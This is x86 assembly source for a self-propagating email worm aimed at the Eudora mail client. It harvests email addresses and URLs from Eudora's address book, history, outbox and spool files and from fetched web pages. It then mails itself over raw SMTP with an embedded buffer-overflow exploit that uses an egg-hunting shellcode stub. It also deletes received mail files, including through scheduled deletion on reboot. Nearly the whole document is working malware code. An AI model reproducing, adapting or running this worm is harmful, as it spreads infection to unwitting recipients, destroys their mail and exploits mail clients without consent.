worm   PROC PASCAL
  ARG seh_ptr:DWORD
  ARG x:DWORD

  LOCAL emailaddress:DWORD                      ;volatile!
  LOCAL urladdress:DWORD                        ;volatile!
  LOCAL eudoradir:BYTE:MAX_PATH
  LOCAL buffer:BYTE:MAX_PATH
  LOCAL handle:DWORD
  LOCAL fsize:DWORD
  LOCAL fmem:DWORD
  LOCAL mailhash:DWORD
  LOCAL wwwhash:DWORD
  LOCAL wbuffer:DWORD
  LOCAL fsearch:DWORD

  LOCAL __MessageBoxA:DWORD

  LOCAL __gethostbyname:DWORD
  LOCAL __closesocket:DWORD
  LOCAL __send:DWORD
  LOCAL __recv:DWORD
  LOCAL __connect:DWORD
  LOCAL __socket:DWORD

  LOCAL __InternetCloseHandle:DWORD
  LOCAL __InternetReadFile:DWORD
  LOCAL __InternetOpenUrlA:DWORD
  LOCAL __InternetOpenA:DWORD

  LOCAL __Sleep:DWORD
  LOCAL __GetTickCount:DWORD
  LOCAL __MoveFileExA:DWORD
  LOCAL __GetFileSize:DWORD
  LOCAL __WritePrivateProfileStringA:DWORD
  LOCAL __DeleteFileA:DWORD
  LOCAL __FindClose:DWORD
  LOCAL __FindNextFileA:DWORD
  LOCAL __FindFirstFileA:DWORD
  LOCAL __ReadFile:DWORD
  LOCAL __LocalFree:DWORD
  LOCAL __LocalAlloc:DWORD
  LOCAL __GetModuleFileNameA:DWORD
  LOCAL __CreateThread:DWORD
  LOCAL __CloseHandle:DWORD
  LOCAL __CreateFileA:DWORD
  LOCAL __LoadLibraryA:DWORD
  LOCAL __GetProcAddress:DWORD

       int 3
       jmp @@skipmark

marker db "EUD5WORM"

  @@delta1:
       pop edi
       retn
  @@delta:
       call @@delta1

  @@skipmark:
       call @@delta
       xchg esi,edi
       sub esi,-(ofs @@startcode-ofs @@skipmark)
       sub eax,eax
       mov ecx,eax
       sub ecx,-(ofs __mailbody-ofs @@startcode)
  @@search_space:
       lodsb
       sub al, " "
       jne @@next
       mov [esi-1],ah
  @@next:
       loop @@search_space

       jmp @@killpiq
       nop
  @@killpiq:

  @@startcode:
       call find_getprocaddress

       mov [__GetProcAddress],eax

       call @@delta
       lea ecx,[edi+(ofs __exit-ofs @@skipmark)]
       mov [seh_ptr],ecx

       lea esi,[edi+(ofs apinames-ofs @@skipmark)]
       lea edi,[__LoadLibraryA]
  @@kernelloop:
       push esi
       push ebx
       call [__GetProcAddress]
       stosd
  @@kernelseekend:
       lodsb
       test al,al
       jnz @@kernelseekend
       cmp by [esi],-1
       je @@done_apis
       cmp by [esi],0
       jne @@kernelloop

       inc esi
       push esi
       call [__LoadLibraryA]
       xchg eax,ebx
       jmp @@kernelseekend

  @@done_apis:
       lea esi,[eudoradir]
       push MAX_PATH
       push esi
       push 0
       call [__GetModuleFileNameA]
       add esi,eax
       sub eax,eax
  @@sslash:
       cmp by [esi-1],"\"
       je @@done
       dec esi
       jmp @@sslash
  @@done:
       mov [esi],eax

       push (1024*8)*4             ;suport 8192 sites(unicos) por sessao...
       push 40h
       call [__LocalAlloc]
       mov [wwwhash],eax

       push (1024*8)*4             ;suport 8192 emails(unicos) por sessao...
       push 40h
       call [__LocalAlloc]
       mov [mailhash],eax

       push (__mailbody_size+xploit_size+3+worm_size+5)
       push 40h
       call [__LocalAlloc]

       mov [wbuffer],eax
       call @@delta
       xchg ebx,edi
       mov edi,eax

       call [__GetTickCount]
       lea edx,[esp+eax]
       and eax, 0f0f0f0fh
       and edx, 0f0f0f0fh
       add eax,"AAAA"
       add edx,"ZZZZ"-0f0f0f0fh

       mov [ebx+(ofs marker-ofs @@skipmark)],eax
       mov [ebx+(ofs search1-ofs @@skipmark)],eax
       mov [ebx+(ofs marker-ofs @@skipmark)+4],edx
       mov [ebx+(ofs search2-ofs @@skipmark)],edx

       lea esi,[ebx+(ofs __mailbody-ofs @@skipmark)]
       mov ecx,__mailbody_size+xploit_size
       rep movsb

       mov eax, 0a0d00h+'"'
       stosd
       dec edi
       shr eax,8
       stosw

       lea esi,[ebx+(ofs worm-ofs @@skipmark)]
       mov ecx,worm_size XOR 12345678h
       XOR ecx,12345678h
  @@nextb:
       lodsb
       test al,al
       jnz @@no0
       add al, " "-1
       inc al
  @@no0:
       stosb
       loop @@nextb

       mov eax, -0d2e0a0dh
       neg eax
       stosd
       shr eax,8
       stosb

       lea eax,[ebx+(ofs file3-ofs @@skipmark)]
       push eax
       sub eax,-(ofs file2-ofs file3)
       push eax
       sub eax,-(ofs file1-ofs file2)
       push eax
       call __loadfile
       call __loadfile
       call __loadfile

       push dwo [wbuffer]
       call [__LocalFree]

       push dwo [mailhash]
       call [__LocalFree]

       push dwo [wwwhash]
       call [__LocalFree]

       lea eax,[ebx+(ofs filemask-ofs @@skipmark)]
       push eax
       call __copydir

       add esp, -SIZEOF_WIN32_FIND_DATA

       push esp
       push edi
       call [__FindFirstFileA]
       mov [fsearch],eax
       inc eax
       jz @@searchend

  @@search_loop:
       lea eax,[esp.WFD_szFileName]
       push eax
       call __copydir

       push edi
       call [__DeleteFileA]
       test eax,eax
       jnz @@donedel

       push 4                   ;MOVEFILE_DELAY_UNTIL_REBOOT
       push eax                 ;0
       push edi
       call [__MoveFileExA]
       test eax,eax
       jnz @@donedel

       lea eax,[ebx+(ofs wininit-ofs @@skipmark)]
       push eax
       push edi
       add eax,ofs null-ofs wininit
       push eax
       add eax,ofs rename-ofs null
       push eax
       call [__WritePrivateProfileStringA]

  @@donedel:
       push esp
       push dwo [fsearch]
       call [__FindNextFileA]
       test eax,eax
       jnz @@search_loop

       push dwo [fsearch]
       call [__FindClose]

  @@searchend:
       sub esp, -SIZEOF_WIN32_FIND_DATA

  __exit:
       nop
       push -1
       call [__Sleep]



  __copydir:
       lea edi,[buffer]
       pushad
       lea esi,[eudoradir]
       push -1
       pop ecx
  @@cpy:
       lodsb
       test al,al
       jz @@donecpy
       stosb
       jmp @@cpy
  @@donecpy:
       inc ecx
       mov esi,[esp.cPushad.Arg1]
       jecxz @@cpy
       stosb
       popad
       ret 4


  __loadfile:
       pushad

       push dwo [esp.cPushad.Arg1]
       call __copydir

       sub edx,edx
       xchg edx,edi

       push edi
       push FILE_ATTRIBUTE_NORMAL
       push OPEN_EXISTING
       push edi
       push FILE_SHARE_READ
       push GENERIC_READ
       push edx
       call [__CreateFileA]
       mov [handle],eax
       inc eax
       jz @@error666

       push edi
       push dwo [handle]
       call [__GetFileSize]
       mov [fsize],eax

       add eax,10h
       push eax
       push 40h
       call [__LocalAlloc]
       mov [fmem],eax

       push edi
       mov ecx,esp

       push edi
       push ecx
       push dwo [fsize]
       add eax,10h
       push eax
       push dwo [handle]
       call [__ReadFile]
       pop dwo [fsize]

       push dwo [fsize]
       push dwo [fmem]
       call __search_www_mail

  @@errormem:
       push dwo [fmem]
       call [__LocalFree]

  @@error:
       push dwo [handle]
       call [__CloseHandle]

  @@error666:
       popad
       ret 4


  __read_url:
       pushad

       mov ebp,[esp.cPushad.Arg1]
       mov esi,[urladdress]

       call @@seh123
       jmp __exit
  @@seh123:
       push dwo fs:[0]
       mov fs:[0],esp

       add esp,-MAX_PATH

       mov edi,esp
  @@repeatcpy:
       lodsb
       stosb
       test al,al
       jnz @@repeatcpy

       mov ebx,esp

       sub esi,esi

       push "V"
       mov eax,esp
       push esi
       push esi
       push esi
       push esi
       push eax
       call [__InternetOpenA]
       pop ecx
       test eax, eax
       jz @@not_connected
       mov edi, eax                     ;edi==first handle

       push esi
       push esi
       push esi
       push esi
       push ebx                 ;url
       push eax
       call [__InternetOpenUrlA]
       test eax, eax
       jz @@not_connected1
       mov ebx, eax                     ;ebx==second handle

       push 64*1024
       push 40h
       call [__LocalAlloc]
       test eax, eax
       jz @@not_connected2
       mov esi,eax

       push eax
       push esp
       push 64*1024
       push eax
       push ebx
       call [__InternetReadFile]

       push esi                        ;size already in stack
       call __search_www_mail

       push esi
       call [__LocalFree]

  @@not_connected2:
       push ebx
       mov ebx,ecx                      ;ebx==size
       call [__InternetCloseHandle]

  @@not_connected1:
       push edi
       call [__InternetCloseHandle]

  @@not_connected:
       sub esp,-MAX_PATH
       pop dwo fs:[0]
       pop eax
       popad
       ret 4


  __send_email:
       pushad

       mov ebp,[esp.cPushad.Arg1]
       mov esi,[emailaddress]

       call @@seh122
       jmp __exit
  @@seh122:
       push dwo fs:[0]
       mov fs:[0],esp

       add esp,-MAX_PATH

       lea edi,[esp+9]
  @@cpy999:
       lodsb
       stosb
       test al,al
       jnz @@cpy999

       mov edi,esp
       mov eax, "TPCR"
       stosd
       mov eax, -":OT "
       neg eax
       stosd
       mov al,"<"
       stosb

       lea esi,[esp+9]
  @@searchat999:
       lodsb
       cmp al,"@"
       jnz @@searchat999

       push IPPROTO_TCP
       push SOCK_STREAM
       push PF_INET
       call [__socket]
       mov ebx,eax
       inc eax
       jz @@exit666

       sub ecx,ecx

       push ecx
       push ecx
       push ecx                 ;IP
       push 019000002h

       dec ecx       ;3 loops...
       dec ecx
       dec ecx
       dec ecx

  @@dns_smtp:
       inc ecx
       test ecx,ecx
       jz @@exit444

       push ecx
       push esi
       add esp,-MAX_PATH

       mov edi,esp
       mov eax, "ptms"
       cmp cl,-3
       je @@dot
       xor eax, "liam" xor "ptms"
       cmp cl,-2
       jne @@cpycpy
       nop
  @@dot:
       stosd
       mov al, "."
       stosb
  @@cpycpy:
       lodsb
       stosb
       test al,al
       jnz @@cpycpy

       push esp
       call [__gethostbyname]
       test eax,eax
       jz @@trynext

       mov eax,[eax+12]
       mov eax,[eax]
       mov eax,[eax]

       lea ecx,[esp+2*4+MAX_PATH]

       mov [ecx+4],eax

       push 16
       push ecx
       push ebx
       call [__connect]
       test eax,eax
       jz @@connected

  @@trynext:
       sub esp,-MAX_PATH
       pop esi
       pop ecx
       jmp @@dns_smtp
       nop

  @@connected:
       sub esp,-(MAX_PATH+2*4+4*4)
       mov esi,esp

       push 0a0d00h+">"
       push "moc."
       push "mmoc"
       push "lauq"
       push "@vyl"
       mov eax, -"f<:M"
       neg eax
       push eax
       mov eax, -"ORF "
       neg eax
       push eax
       push "LIAM"
       mov ecx,esp

       push 0
       push 0a0d0000h+"ts"
       push "ohla"
       mov eax, -"col "
       neg eax
       push eax
       push "OLEH"
       mov edx,esp

       push 0a0dh
       push "ATAD"
       mov eax,esp

       push 0a0dh
       push "TIUQ"

       mov edi,esp
       push esp
       push dwo [wbuffer]
       push eax
       push esi
       push ecx
       push edx

  @@cpy9991:
       lodsb
       test al,al
       jnz @@cpy9991
       mov dwo [esi-1],0a0d00h+">"

  @@sendloop:
       add esp,-MAX_PATH
       mov eax,esp
       push 0
       push MAX_PATH
       push eax
       push ebx
       call [__recv]
       pop eax
       sub esp,-(MAX_PATH-4)

       sub al, "2"
       je @@fine
       dec al
       jnz @@error444
  @@fine:

       cmp edi,esp
       je @@error444

       pop esi
       mov edx,esi
       sub ecx,ecx
  @@strlen666:
       lodsb
       test al,al
       jz @@done_strlen
       inc ecx
       jmp @@strlen666
  @@done_strlen:

       push 0
       push ecx
       push edx
       push ebx
       call [__send]
       inc eax
       jnz @@sendloop

  @@error444:
       lea esp, [edi+2*4+2*4+5*4+8*4-4*4]

  @@exit444:
       add esp,4*4

       push ebx
       call [__closesocket]

  @@exit666:
       sub esp,-MAX_PATH
       pop dwo fs:[0]
       pop eax
       popad
       ret 4


  __search_www_mail:
       pushad
       mov esi,[esp.cPushad.Arg1]
       mov ebx,esi
       add ebx,[esp.cPushad.Arg2]

  @@searchsearch:
       cmp dwo [esi], "ptth"
       jne @@maybeemail
       cmp wo [esi+4], "/:"
       je @@www

  @@maybeemail:
       cmp by [esi], "@"
       jne @@continuesearch

       push esi
       lea ecx,[esi+11]                ;domain name minimum size is 6
       sub eax,eax
  @@keepchecking:
       lodsb
       cmp al,'.'
       jne @@skipdot
       mov ah,1
  @@skipdot:
       call __checkchar
       jne @@jmp2avaliate
       cmp esi,ecx
       jne @@keepchecking
  @@jmp2avaliate:
       dec ah                   ;at least a . was found?
       jnz @@avaliate

       std
       sub esi,12
       push 10h
       pop ecx
  @@checkstart:
       lodsb
       call __checkchar
       jne @@foundstartemail
       loop @@checkstart
       cmp eax,esp
       jmp @@avaliate
  @@foundstartemail:
       cld

       inc esi
       inc esi
       xor eax,eax
       xchg eax,esi

  @@avaliate:
       pop esi
       jne @@continuesearch

  @@email:
       push eax
       call __set_string_end

       push eax
       push [mailhash]
       call __check_hash
       je @@continuesearch

       mov [emailaddress],eax
       call @@create_thread
       jmp __send_email

  @@www:
       lea eax,[esi+7]
       push eax
       call __set_string_end

       push esi
       push [wwwhash]
       call __check_hash
       je @@continuesearch

       mov [urladdress],esi
       call @@create_thread
       jmp __read_url

  @@create_thread:
       pop eax
       sub ecx,ecx
       push ecx
       push esp
       push ecx
       push ebp
       push eax
       push ecx
       push ecx
       call [__CreateThread]
       pop eax

       push 1000
       call [__Sleep]

  @@continuesearch:
       inc esi
       cmp esi,ebx
       jb @@searchsearch

       popad
       ret 4*2


  __set_string_end:
       push eax esi
       mov esi,[esp.Pshd.Pshd.Arg1]
  @@l1:
       lodsb
       call __checkchar
       je @@l1
  @@set0end:
       mov by [esi-1],0
       pop esi eax
       ret 4


  __checkchar:
       pushad

       cmp al,"_"
       je @@finefine

       cmp al,"/"
       je @@finefine

       cmp al,"-"
       je @@finefine

       cmp al,"."
       je @@finefine2

       cmp al,"@"
  @@finefine2:
       je @@finefine

       cmp al,"A"
       jb @@errorerror123
       cmp al,"Z"
       jbe @@finefine

 @@errorerror123:
       cmp al,"0"
       jb @@errorerror321
       cmp al,"9"
       jbe @@finefine

 @@errorerror321:
       cmp al,"a"
       jb @@errorerror
       cmp al,"z"
       jbe @@finefine

  @@errorerror:
       cmp esp,eax
       mov ax,?
     org $-2
  @@finefine:
       xor eax,eax
  @@exitexit:
       popad
       ;NZ -> not a valid email character
       ;Z  -> valid email character
       retn


  __check_hash:
       pushad
       mov edi,[esp.cPushad.Arg1]
       mov esi,edi
       sub ecx,ecx
  @@count:
       lodsd
       test eax,eax
       jz @@donecount
       inc ecx
       jmp @@count
  @@donecount:
       mov eax,[esp.cPushad.Arg2]
       call @@calchash
       jecxz @@addit
       repne scasd
       je @@already
  @@addit:
       stosd
       cmp eax,esp
  @@already:
       popad
       ret 2*4

       nop
  @@calchash:
       pushad

       mov esi,[esp.Pushad_eax]
       mov edx,esi

       sub ecx,ecx
  @@countcount:
       lodsb
       test al,al
       jz @@crcdone
       inc ecx
       jmp @@countcount
  @@crcdone:
       sub eax,eax

       jecxz @@4
  @@1:
       xor al, [edx]
       inc edx
       mov bl, 8
  @@2:
       shr eax, 1
       jnc @@3
       xor eax, 0EDB88320h XOR 3
       xor al,3
  @@3:
       dec bl
       jnz @@2
       loop @@1
  @@4:

       mov [esp.Pushad_eax],eax
       popad
       retn
worm   ENDP


include findk32.inc


apinames db "LoadLibraryA",0
         db "CreateFileA",0
         db "CloseHandle",0
         db "CreateThread",0
         db "GetModuleFileNameA",0
         db "LocalAlloc",0
         db "LocalFree",0
         db "ReadFile",0
         db "FindFirstFileA",0
         db "FindNextFileA",0
         db "FindClose",0
         db "DeleteFileA",0
         db "WritePrivateProfileStringA",0
         db "GetFileSize",0
         db "MoveFileExA",0
         db "GetTickCount",0
         db "Sleep",0
         db 0

         db "WININET",0
         db "InternetOpenA",0
         db "InternetOpenUrlA",0
         db "InternetReadFile",0
         db "InternetCloseHandle",0
         db 0

         db "WSOCK32",0
         db "socket",0
         db "connect",0
         db "recv",0
         db "send",0
         db "closesocket",0
         db "gethostbyname",0
         db 0

         db "USER32",0
         db "MessageBoxA",0
         db -1


file1    db "HISTORY.LST",0
file2    db "NNDBASE.TXT",0
file3    db "OUT.MBX",0

filemask db "SPOOL\*.RCV",0

wininit  db "WININIT.INI",0
null     db "NUL",0
rename   db "Rename",0

__mailbody db "From: flyv@qualcomm.com",13,10
           db "To: root@localhost.org",13,10
           db "Subject: Flying V",13,10

           db 'MIME-Version: 1.0',13,10
           db 'Content-Type: multipart/mixed; boundary="'       ;",13,10
__mailbody_size equ $-__mailbody


JMPCALL_EAX equ 061502d5ah
VALUE       equ 174
X           equ 13131313h


xploit:
       db "--"

  @@delta1:
       pop eax
       retn
  @@delta:
       call @@delta1

  @@main:
       call @@delta
       add eax,(ofs @@seh-ofs @@main)
       push eax
       push dwo fs:[ecx]
       jmp @@jmp2search

  @@search:
       dec esi
       cmp dwo [esi], "5DUE"		;search for egg...
search1 equ $-4
       jne @@search
       cmp dwo [esi+4], "MROW"
search2 equ $-4
       jne @@search
       add esi,-(ofs marker-ofs worm)
       jmp esi

  @@seh:
       mov esi,[esp.EH_ContextRecord]
       mov esp,[esp.EH_EstablisherFrame]
       push 0a0h/8                             ;CONTEXT_Esi
       pop ecx
       mov esi,[esi+ecx*8]
       add ecx,((not 0fffh)-(0a0h/8))
       and esi,ecx
       sub ecx,ecx

  @@jmp2search:
       mov fs:[ecx],esp
       jmp @@search

  @@jmp2main:
       jmp @@main
       db VALUE-(($-ofs xploit)+2) dup ("V")

  @@jmp2jmp2main:
       jmp @@jmp2main

  @@entrypoint:
       sub ecx,ecx
       jmp @@jmp2jmp2main

new_eip dd JMPCALL_EAX

xploit_size equ $-xploit

worm_size equ $-worm
